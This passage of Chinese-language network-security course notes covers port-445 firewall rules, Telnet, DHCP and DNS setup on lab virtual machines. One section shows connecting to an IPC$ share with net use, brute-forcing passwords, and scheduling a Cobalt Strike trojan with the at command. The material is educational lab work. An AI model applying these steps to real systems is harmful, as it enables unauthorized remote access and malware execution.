+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071644981.png" alt="image-20220607164416852"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071644732.png" alt="image-20220607164437618"></p>
+<p>然后”配置文件”这个步骤直接点击下一步，”名称”这个步骤随便填一个可以看出来的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071647240.png" alt="image-20220607164723069"></p>
+<p>点击完成就创建成功了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071647763.png" alt="image-20220607164736634"></p>
+<p><strong>当然，刚刚设置的是TCP连接禁止访问445的，而UDP也要禁止，所以还要再设置一个禁止UDP访问445的规则</strong></p>
+<p>一般要么时tcp，要么时udp，唯独是445需要tcp，udp都需要阻止，</p>
+<p>起的名称好记符合程序员通用命名规则就行</p>
+<h2 id="7-ipc植入木马"><a href="#7-ipc植入木马" class="headerlink" title="7.ipc植入木马"></a>7.ipc植入木马</h2><h3 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h3><p>命令行状态下连接文件共享服务器：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip地址\ipc$ 密码 /user:用户名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">当连接成功之后，虽然没有什么反应，但是可以对被攻击的主机进行所有操作，比如访问磁盘，该ipc植入木马的操作相当于先搭了一座桥，然后我们才可以通过卡车运输货物(木马)到对岸(攻击机)</span></span><br><span class="line">C:\WINDOWS\system32&gt;net use \\192.168.29.140\ipc$ 123456 /user:75717</span><br><span class="line">命令成功完成。										   #连接成功</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;net time \\192.168.29.140		#可以查看到192.168.29.140的时间，说明确实连接成功</span><br><span class="line">\\192.168.29.140 的当前时间是 2022/6/8 5:39:01</span><br><span class="line"></span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>一般是按照如下步骤来进行，使用scanport来检查445端口是否开放，NTscan来密码爆破</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206080523999.png" alt="image-20220608052336755"></p>
+<p>然后就是植入木马，可以使用cs来制作木马，然后传到被攻击机的一个磁盘上</p>
+<p>比如说我在cs中创建了一个木马病毒attackwin7.exe</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206082228443.png" alt="image-20220608222858197"></p>
+<p>在Windows10系统会报错，因为微软加强了安全性，取消了空连接。连接时报：“发生系统错误 5。”<a target="_blank" rel="noopener" href="https://blog.csdn.net/abraham76/article/details/123868072">ipc漏洞解释1</a>，<a target="_blank" rel="noopener" href="https://blog.csdn.net/woswod/article/details/63253426">ipc漏洞解释2</a><br>以前建立空会话可以获取一些有用的信息，后来空会话的权限很低，任何访问都会被拒绝。这个实验暂时跳过…</p>
+<p>然后给被攻击机制作一个时间作业，在某个时间进行一个操作，比如运行该木马</p>
+<h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.29.140 15:26 c:\attackwin7.exe    #在下午15:26分执行任务</span><br><span class="line">at \\192.168.29.140							   #查看任务</span><br><span class="line">at \\192.168.29.140 /del					   #删除任务</span><br></pre></td></tr></table></figure>
+
+<h1 id="Telnet服务器远程管理"><a href="#Telnet服务器远程管理" class="headerlink" title="Telnet服务器远程管理"></a>Telnet服务器远程管理</h1><p>如果不想远程桌面管理而是想命令行远程管理的话，telnet也许也是一个不错的选择(windows一般用telnet，linux一般都用ssh)</p>
+<h2 id="1-远程管理类型"><a href="#1-远程管理类型" class="headerlink" title="1.远程管理类型"></a>1.远程管理类型</h2><ul>
+<li>远程桌面(图形)RDP：端口号3389</li>
+<li>telnet(命令行)：端口号23</li>
+</ul>
+<h2 id="2-Telnet远程连接"><a href="#2-Telnet远程连接" class="headerlink" title="2.Telnet远程连接"></a>2.Telnet远程连接</h2><ul>
+<li>首先确保服务器和客户机互通</li>
+<li>win+R运行中打开<strong>services.msc</strong>，找到<strong>Telnet</strong>服务，启动，并且启动类型改成自动启动</li>
+<li><code>netstat -an</code>查看Telnet端口<strong>23</strong>是否打开(注意，23端口是服务器打开的，客户机不用开)</li>
+<li>把想要远程连接的用户添加到<strong>TelnetClients</strong>组</li>
+<li><code>telnet ip地址</code>，输入用户名和密码</li>
+</ul>
+<hr>
+<p>在实际操作中，发现我的win 7没有Telnet服务，这时候</p>
+<p>打开控制面板–&gt;程序和功能–&gt;打开和关闭windows功能–&gt;telnet服务器客户端打钩(只充当服务端只需要打钩telnet服务器)–&gt;确定</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090049131.png" alt="image-20220609004939957"></p>
+<p>打钩之后就可以在services.msc看到Telnet服务了，这个服务是用来被连接的，启动类型修改为自动，点击应用，就可以点击服务状态下面的启动按钮了，再点击确定</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090052565.png" alt="image-20220609005236451"></p>
+<p>用<code>netstat -an</code>查看telnet默认端口23是否已经开启，23端口开启说明该主机可以<strong>被连接</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090053439.png" alt="image-20220609005312337"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090055078.png" alt="image-20220609005529942"></p>
+<p>这时候服务端就准备好被连接了</p>
+<hr>
+<p>客户机需要在程序中安装<code>Telnet客户端</code>服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090103955.png" alt="image-20220609010333851"></p>
+<p>点击确定，windows会自动安装该服务</p>
+<p><strong>需要注意：这里是win 10，Telnet 服务端不再列入 Windows 10 ，建议是使用远程桌面来代替。所以客户机在services.msc中是看不到telnet服务的，在<code>netstat -an</code>中也看不到23端口，因为telnet服务和23端口是用来被连接的</strong></p>
+<p>win 7服务端的ip地址是192.168.29.140，所以在win 10客户机的cmd中输入<code>telnet 192.168.29.140</code>，然后输入服务端的用户和密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090118167.png" alt="image-20220609011809059"></p>
+<p>注意这里输入密码是不会显示在页面的，这是为了安全~</p>
+<p>用户和密码正确后就可以用命令行对win 7服务器进行操作了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090119535.png" alt="image-20220609011949446"></p>
+<p>在服务端中新建haha.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090121448.png" alt="image-20220609012151336"></p>
+<p>回到win 7桌面，可以看到该文件已经创建</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090122680.png" alt="image-20220609012230577"></p>
+<p>使用<code>exit</code>退出telnet的连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206090124488.png" alt="image-20220609012406305"></p>
+<h1 id="DHCP部署与安全"><a href="#DHCP部署与安全" class="headerlink" title="DHCP部署与安全"></a>DHCP部署与安全</h1><p>DHCP只有在专门的服务器操作系统(在windows操作系统中，只能使用Server版的，即windows server 2003)才能搭建</p>
+<h2 id="1-DHCP作用"><a href="#1-DHCP作用" class="headerlink" title="1.DHCP作用"></a>1.DHCP作用</h2><p>(Dynamic Host Configure Protocol)自动为客户机分配IP地址</p>
+<h2 id="2-DHCP优点"><a href="#2-DHCP优点" class="headerlink" title="2.DHCP优点"></a>2.DHCP优点</h2><p>减少工作量、避免IP冲突(不会重复分配已被分配的ip)、提高地址利用率(ip地址的回收，再使用)</p>
+<h2 id="3-DHCP相关概念"><a href="#3-DHCP相关概念" class="headerlink" title="3.DHCP相关概念"></a>3.DHCP相关概念</h2><ul>
+<li>地址池/作用域：(IP、子网掩码、网关、DNS、租期)</li>
+<li>DHCP协议端口是UDP 67/68 (就是如果想要充当DHCP服务器，这两个端口必须打开,两个端口是因为兼容问题，67兼容老版本比如xp，68兼容win7 、win10等)</li>
+</ul>
+<h2 id="4-DHCP原理"><a href="#4-DHCP原理" class="headerlink" title="4.DHCP原理"></a>4.DHCP原理</h2><p>也成为DHCP租约过程，分为4个步骤</p>
+<h3 id="1）客户机发送DHCP-Discovery广播包"><a href="#1）客户机发送DHCP-Discovery广播包" class="headerlink" title="1）客户机发送DHCP Discovery广播包"></a>1）客户机发送DHCP Discovery广播包</h3><p>客户机广播请求IP地址(包含客户机的<strong>MAC地址</strong>，这个MAC地址被固化在电脑的网卡中，全世界唯一)</p>
+<h3 id="2）服务器响应DHCP-Offer广播包"><a href="#2）服务器响应DHCP-Offer广播包" class="headerlink" title="2）服务器响应DHCP Offer广播包"></a>2）服务器响应DHCP Offer广播包</h3><p>服务器响应提供的IP地址(但无子网掩码、网关等参数)</p>
+<h3 id="3）客户机发送DHCP-Request广播包"><a href="#3）客户机发送DHCP-Request广播包" class="headerlink" title="3）客户机发送DHCP Request广播包"></a>3）客户机发送DHCP Request广播包</h3><p>客户机选择lP(也可认为确认使用哪个IP)</p>
+<h3 id="4）服务器发送DHCP-ACK广播包"><a href="#4）服务器发送DHCP-ACK广播包" class="headerlink" title="4）服务器发送DHCP ACK广播包"></a>4）服务器发送DHCP ACK广播包</h3><p>服务器确定了租约，并提供网卡详细参数IP、掩码、网关、DNS、租期等</p>
+<h2 id="5-DHCP续约"><a href="#5-DHCP续约" class="headerlink" title="5.DHCP续约"></a>5.DHCP续约</h2><p>DHCP租约时间由公司决定，当租约时间经过了<strong>50%<strong>之后，客户机会再次发送</strong>DHCP Request</strong>包，进行续约，如续约成功，则重新计算该租约时间(<strong>时间刷新</strong>)，如服务器无响应，则继续使用并在<strong>87.5%<strong>再次</strong>DHCP Request</strong>包，进行续约，如仍然无响应，不再继续使用该IP地址、掩码、网关、DNS，同时重新发送<strong>DHCP Discovery</strong>广播包来获取IP地址，当无任何服务器响应时，自动给自己分配一个<strong>169.254.x.x/16</strong>,属于<strong>全球统一无效地址</strong>，用于<strong>临时内网通信</strong>!</p>
+<p>question：如果DHCP服务器分配了250个IP地址给客户，租期为8天，如果客户只用了2个小时就关机走人，IP地址会不会收回？</p>
+<p>答：不会，租期为8天，这8天内不会自动还回去，直到8天后，服务器才会把IP地址收回，就像是在学校的机房，使用两小时关机之后，如果9天都没有开机，且租期为8天，则下次开机IP地址<strong>可能</strong>就会改变了，除非绑定了MAC地址或者该IP地址在开机的时候还没有被别的电脑使用，DHCP会把之前的IP地址再重新分配给你。如果8天内开机，电脑会自动发送Request包给DHCP请求续约。</p>
+<p>所以租期的长短必须要根据情况而定，没有固定员工的就选短租期，如果很多固定员工就选长租期，<strong>短租期的话员工太多所以主机对DHCP服务器续约的请求太多，频繁续约网络压力大，长租期的话如果员工不固定，即使员工走了，IP地址会一直在占用，就可能导致IP地址不够用</strong></p>
+<h2 id="6-部署DHCP服务器步骤"><a href="#6-部署DHCP服务器步骤" class="headerlink" title="6.部署DHCP服务器步骤"></a>6.部署DHCP服务器步骤</h2><p>1）IP地址固定（服务器必须固定IP地址，用什么地址？必须用将来给员工提供的地址在同一网段的IP）</p>
+<p>2）安装DHCP服务插件，输入<code>netstat -an</code>验证67/68端口是否开启</p>
+<p>3）新建作用域及作用域选项</p>
+<p>4）激活</p>
+<p>5）客户机验证：可以图形界面禁用再启用网卡来获取地址，也可以使用命令行来完成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release 释放IP（取消租约，或者改为手动配置IP，也可以释放租约）</span><br><span class="line"></span><br><span class="line">ipconfig /renew   重新获取IP（有IP时，发送request续约，无IP时发送Discovery重新获取IP）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>这里win server 2003当作DHCP服务器，win XP当作使用DHCP服务器的主机，然后都是桥接到VMnet1上</p>
+<p>这里需要注意一点，虚拟机中自带一个DHCP服务器，需要在虚拟网络编辑器中关掉，左上角编辑–&gt;虚拟网络编辑器，选择VMnet1(以上两台实验机桥接的网卡)，然后把”使用本地DHCP服务将IP地址分配给虚拟机”的勾去掉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100300905.png" alt="image-20220610030053784"></p>
+<p>应用并确定，DHCP列就变成横杠了(表示没有启动本地DHCP服务器，因为我们要自己创建一个)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100301722.png" alt="image-20220610030115556"></p>
+<p>先在XP中选择自动获取IP地址和DNS，然后使用<code>ipconfig</code>查看当前IP地址，可以看到是169.254开头的，说明没有配置DHCP服务器来提供IP地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092010996.png" alt="image-20220609201014877"></p>
+<p>然后搭建DHCP服务器需要做的就是把我们的Win2003安装光盘放进我们电脑的光驱里面，首先要确保的是这张光盘可以正常读盘。然后双击光盘，选择安装组件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091940360.png" alt="image-20220609194048171"></p>
+<p>然后往下拉，找到”网络服务”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091941485.png" alt="image-20220609194155366"></p>
+<p>双击”网络服务”，找到”动态主机配置协议(DHCP)”并打钩–&gt;确定–&gt;下一步，就开始安装DHCP服务了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091942636.png" alt="image-20220609194229518"></p>
+<p>然后在开始菜单–&gt;所有程序–&gt;管理工具，可以找到DHCP的服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091945045.png" alt="image-20220609194501921"></p>
+<p>或者使用<code>netstat -an</code>查看67/68端口是否已经开启，如开启，则DHCP服务安装成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091947263.png" alt="image-20220609194702142"></p>
+<p>在DHCP服务页面中，右键服务器–&gt;新建作用域</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091947245.png" alt="image-20220609194744137"></p>
+<p>随便起个名字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091949565.png" alt="image-20220609194915437"></p>
+<p>有些服务器需要固定IP地址，所以起始IP地址范围可以留几个IP地址，DHCP服务器也是要固定IP地址的，一般IP是1，网关是254，所以结束IP地址尽量253</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091958340.png" alt="image-20220609195836200"></p>
+<p>点击”下一步”，添加排除地址，就是在刚刚的作用域范围内可以选择不分配的IP地址范围，比如说不分配100到105的IP地址，<strong>这里填完之后必须要点添加按钮！</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092000961.png" alt="image-20220609200001773"></p>
+<p>点击”下一步”，选择DHCP给的IP地址的租约期限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092000247.png" alt="image-20220609200055126"></p>
+<p>点击”下一步”之后，选择”是，我想现在配置这些选项”，就可以配置DHCP给的网关和DNS</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092002180.png" alt="image-20220609200224000"></p>
+<p>把网关设置成254</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092003912.png" alt="image-20220609200326806"></p>
+<p>添加一个或多个DNS</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092004772.png" alt="image-20220609200433637"></p>
+<p>点击”下一步”之后，可以看到DHCP服务器的老版本WINS服务器，直接点击”下一步”就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092005224.png" alt="image-20220609200522089"></p>
+<p>然后可以选择是否现在激活作用域</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092006951.png" alt="image-20220609200609830"></p>
+<p>如果选择否，也可以在DHCP界面中看到作用域，右键点击激活就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092007802.png" alt="image-20220609200711572"></p>
+<p>激活之后在XP系统中禁用网卡/适配器，再重新启用就可以了</p>
+<p>也可以在命令行中先<code>ipconfig /release</code>表示丢弃IP地址，相当于禁用网卡/适配器，<code>ipconfig /renew</code>重新获取地址，相当于重新启用网卡/适配器，再<code>ipconfig</code>就可以看到主机已经被分配ip地址了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092013582.png" alt="image-20220609201344447"></p>
+<p><code>ipconfig /all</code>可以看DNS</p>
+<p>然后在win server 2003的DHCP页面中可以看到IP地址的分配情况、XP系统的主机名称、租期截止日期、XP系统的MAC地址等信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092015463.png" alt="image-20220609201535346"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100245876.png" alt="image-20220610024512694"></p>
+<p>添加之后右侧会显示刚才设置的保留名称</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100245564.png" alt="image-20220610024552436"></p>
+<p>在win 7中<code>ipconfig /release</code>并<code>ipconfig /renew</code>之后，就可以看到该主机已经拿到188的IP了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100247282.png" alt="image-20220610024708123"></p>
+<p>回到win server 2003的DHCP页面也可以从”地址租约”中看到分配的IP地址已经变成了188</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100247615.png" alt="image-20220610024751512"></p>
+<h2 id="7-地址保留"><a href="#7-地址保留" class="headerlink" title="7.地址保留"></a>7.地址保留</h2><p>如果某主机需要指定的IP地址，比如说指定188的IP，则可以在DHCP页面保留该188的IP给指定的MAC地址的主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100243537.png" alt="image-20220610024354399"></p>
+<hr>
+<h2 id="8-DHCP攻击"><a href="#8-DHCP攻击" class="headerlink" title="8.DHCP攻击"></a>8.DHCP攻击</h2><ul>
+<li>攻击DHCP服务器(DDOS攻击)：黑客伪装成不同的MAC地址来对DHCP请求IP地址，导致IP地址不够用</li>
+<li>伪装DHCP服务器攻击：黑客伪装成DHCP给客户发放假IP地址，假IP地址因为跟网关的网段不同所以上不了网，这时候可以<code>ipconfig /all</code>查看提供该IP的DHCP服务器是什么IP，就能抓到黑客啦</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100253837.png" alt="image-20220610025348652"></p>
+<h1 id="DNS部署与安全"><a href="#DNS部署与安全" class="headerlink" title="DNS部署与安全"></a>DNS部署与安全</h1><h2 id="1-DNS"><a href="#1-DNS" class="headerlink" title="1.DNS"></a>1.DNS</h2><p>Domain Name Service</p>
+<p>域名服务</p>
+<p>作用：为客户机提供域名解析服务器</p>
+<p><strong>公司内部自己架设DNS服务器，是为了让解析速度更快一点，公司内部用户再访问某域名的时候就不需要向公网DNS请求IP地址了。</strong></p>
+<p>**而转发器是当内部DNS服务器没有缓存某个域名时并且没有注册该域名，当公司内部用户访问的时候，可以把该请求转发到公网DNS解析，这样的话内部DNS服务器就不用这么累了(不用迭代查询了，让公网DNS服务器帮忙迭代查询后把结果传回来，然后内部DNS服务器缓存该IP)**，如果没有设置转发器，则内部DNS服务器会自己去找根域，自己进行迭代查询。</p>
+<h2 id="2-域名组成"><a href="#2-域名组成" class="headerlink" title="2.域名组成"></a>2.域名组成</h2><h3 id="1）域名组成概述"><a href="#1）域名组成概述" class="headerlink" title="1）域名组成概述"></a>1）域名组成概述</h3><p>如”<a target="_blank" rel="noopener" href="http://www.jason177.com&quot;是一个域名,从严格意义上来讲,&quot;jason177.com&quot;才被称为域名(全球唯一),而&quot;www&quot;是主机名(**主机名是看最后一个域名,也就是最左边第一个的就是主机名,而最右边第一个是顶级域,不是因为com才判断为顶级域,而是因为在根**)/">www.jason177.com&quot;是一个域名，从严格意义上来讲，&quot;jason177.com&quot;才被称为域名(全球唯一)，而&quot;www&quot;是主机名(**主机名是看最后一个域名，也就是最左边第一个的就是主机名，而最右边第一个是顶级域，不是因为com才判断为顶级域，而是因为在根**)</a></p>
+<p>“主机名.域名”称为完全限定域名(FQDN)。一个域名下可以有多个主机，域名全球唯一，那么”主机名.域名”肯定也是全球唯一的。</p>
+<p>以”sina.com”域名为例，一般管理员在命名其主机的时候会根据其主机的功能而命名，比如网站的是www，博客的是blog，论坛的是bbs，那么对应的FQDN为<a target="_blank" rel="noopener" href="http://www.sina.com,blog.sina.com,bbs.sina.com.这么多个fqdn,然而我们只需要申请一个域名即&quot;sina.com.cn&quot;即可./">www.sina.com，blog.sina.com，bbs.sina.com。这么多个FQDN，然而我们只需要申请一个域名即&quot;sina.com.cn&quot;即可。</a></p>
+<p>案例：</p>
+<p>比如我购买了域名sina.com，花了500万，则***.sina.com都属于我的了</p>
+<p>我只需要在我的服务器上(比如服务器IP为3.3.3.3)建一个web页面，然后把***.sina.com和3.3.3.3的映射注册到公网DNS服务器中，别人就可以通过域名访问我的web页面了</p>
+<h3 id="2）域名组成"><a href="#2）域名组成" class="headerlink" title="2）域名组成"></a>2）域名组成</h3><p><strong>树形结构</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100343901.png" alt="image-20220610034309745"></p>
+<p>根域 .</p>
+<p>顶级域</p>
+<ul>
+<li>国家顶级域 cn jp hk uk</li>
+<li>商业顶级域<ul>
+<li>com 商业机构</li>
+<li>gov 政府机构</li>
+<li>mil 军事机构</li>
+<li>edu 教育机构</li>
+<li>org 民间组织机构</li>
+<li>net 互联网</li>
+</ul>
+</li>
+</ul>
+<p>二级域名 </p>
+<p>…..</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">如：www.baidu.com.</span><br><span class="line">.为根域</span><br><span class="line">com为顶级域</span><br><span class="line">baidu为二级域名</span><br><span class="line">www为主机名</span><br><span class="line"></span><br><span class="line">FQDN=主机名.DNS后缀</span><br><span class="line"></span><br><span class="line">FQDN（完整合格的域名）</span><br><span class="line">如：www.baidu.com</span><br><span class="line">baidu.com为域名后缀</span><br><span class="line">www为主机名</span><br><span class="line">www.baidu.com全称为FQDN</span><br><span class="line"></span><br><span class="line">url/网址： http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-监听端口"><a href="#3-监听端口" class="headerlink" title="3.监听端口"></a>3.监听端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS服务监听端口：53  #只要该端口打开，就可以为别人解析了</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-DNS解析种类"><a href="#4-DNS解析种类" class="headerlink" title="4.DNS解析种类"></a>4.DNS解析种类</h2><h3 id="1）按照查询方式分类："><a href="#1）按照查询方式分类：" class="headerlink" title="1）按照查询方式分类："></a>1）按照查询方式分类：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">递归查询：客户机与本地DNS服务器之间（所问即所答）</span><br><span class="line"></span><br><span class="line">迭代查询：本地DNS服务器与根等其他DNS服务器的解析过程（所问非所答）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100355294.png" alt="image-20220610035558092"></p>
+<p>客户机先查看自己浏览器是否有缓存，如果没有，就把域名给本地DNS服务器，后者第一步先查看本地DNS服务器是否有缓存，如果没有，再看本地解析文件，如果本地解析文件还是没有，则本地DNS服务器会通过迭代查询找到该域名的IP地址，找到之后会对该IP地址和域名进行缓存(并不会写入，写入的话需要注册)并返回IP地址给客户机，客户机也会进行缓存 </p>
+<h3 id="2）按照查询内容分类："><a href="#2）按照查询内容分类：" class="headerlink" title="2）按照查询内容分类："></a>2）按照查询内容分类：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向解析：已知域名，解析IP地址</span><br><span class="line"></span><br><span class="line">反向解析：已知IP地址，解析域名</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-DNS服务器搭建过程"><a href="#5-DNS服务器搭建过程" class="headerlink" title="5.DNS服务器搭建过程"></a>5.DNS服务器搭建过程</h2><h3 id="1）要求网卡IP是静态IP地址"><a href="#1）要求网卡IP是静态IP地址" class="headerlink" title="1）要求网卡IP是静态IP地址"></a>1）要求网卡IP是静态IP地址</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110227531.png" alt="image-20220611022751295"></p>
+<h3 id="2）安装DNS服务器插件"><a href="#2）安装DNS服务器插件" class="headerlink" title="2）安装DNS服务器插件"></a>2）安装DNS服务器插件</h3><p>也就是安装并开启TCP及UDP的53端口</p>
+<p>跟安装DHCP服务一样，打开win server 2003的安装程序，选择安装其他服务，下拉双击网络服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110229790.png" alt="image-20220611022905635"></p>
+<p>然后下拉找到域名系统(DNS)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110230310.png" alt="image-20220611023000130"></p>
+<p>点击左下角”开始”–&gt;管理工具就可以看到DNS服务了</p>
+<p>这时候应该先使用<code>netstat -an</code>查看是否已经打开53端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110232708.png" alt="image-20220611023205512"></p>
+<h3 id="3）正向区域创建区域文件"><a href="#3）正向区域创建区域文件" class="headerlink" title="3）正向区域创建区域文件"></a>3）正向区域创建区域文件</h3><p>负责一个域名后缀的解析，如baidu.com为域名后缀，一台DNS服务器内可存放多个区域文件</p>
+<p> 在DNS页面中右键”正向查找区域”–&gt;新建区域</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110249663.png" alt="image-20220611024959544"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110250430.png" alt="image-20220611025025294"></p>
+<p>然后填写域名的后缀(比如说我买了qf.com的域名后缀，那区域名称建议填”qf.com”更好记)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251517.png" alt="image-20220611025120360"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251790.png" alt="image-20220611025141662"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251958.png" alt="image-20220611025153820"></p>
+<p>这时候就可以看到名为”qf.com”的域名解析文件了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110252480.png" alt="image-20220611025234392"></p>
+<h3 id="4）新建A记录"><a href="#4）新建A记录" class="headerlink" title="4）新建A记录"></a>4）新建A记录</h3><p>在右边空白页面右键–&gt;新建主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110253602.png" alt="image-20220611025302461"></p>
+<p>如果想要解析<a target="_blank" rel="noopener" href="http://www.qf.com,则在名称中填&quot;www&quot;,ip地址就写该域名想要对应的ip地址,这样内网员工在访问www.qf.com的时候dns服务器就会返回该对应的ip地址的页面给员工的主机了/">www.qf.com，则在名称中填&quot;www&quot;，IP地址就写该域名想要对应的IP地址，这样内网员工在访问www.qf.com的时候DNS服务器就会返回该对应的IP地址的页面给员工的主机了</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110255790.png" alt="image-20220611025527666"></p>
+<p>因为类型是A，所以叫A记录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110256947.png" alt="image-20220611025630854"></p>
+<ul>
+<li>新建别名</li>
+</ul>
+<p>也可以为该域名起一个别名，比如说域名为”nba.jd.com”，IP为6.6.6.6，如果担心别人经常会输成”cba.jd.com”，就可以为”nba.jd.com”起一个别名为”cba.jd.com”，这样的话别人访问”cba.jd.com”就会解析成”nba.jd.com”，IP地址为6.6.6.6的网站</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111758066.png" alt="image-20220611175809887"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111758704.png" alt="image-20220611175843601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111858195.png" alt="image-20220611185820067"></p>
+<p>使用<code>nslookup</code>手工解析一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111859886.png" alt="image-20220611185939794"></p>
+<p>可以看到”cba.jd.com”被解析成”nba.jd.com”、IP为6.6.6.6(Aliases是别名的意思，说明”cba.jd.com”只是一个别名)</p>
+<p>也可以用<code>ping cba.jd.com</code>命令，可以看到ping的其实是”nba.jd.com”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111901049.png" alt="image-20220611190142955"></p>
+<h3 id="5）反向区域创建区域文件"><a href="#5）反向区域创建区域文件" class="headerlink" title="5）反向区域创建区域文件"></a>5）反向区域创建区域文件</h3><p><strong>nslookup手工解析时，会进行一个反向解析</strong></p>
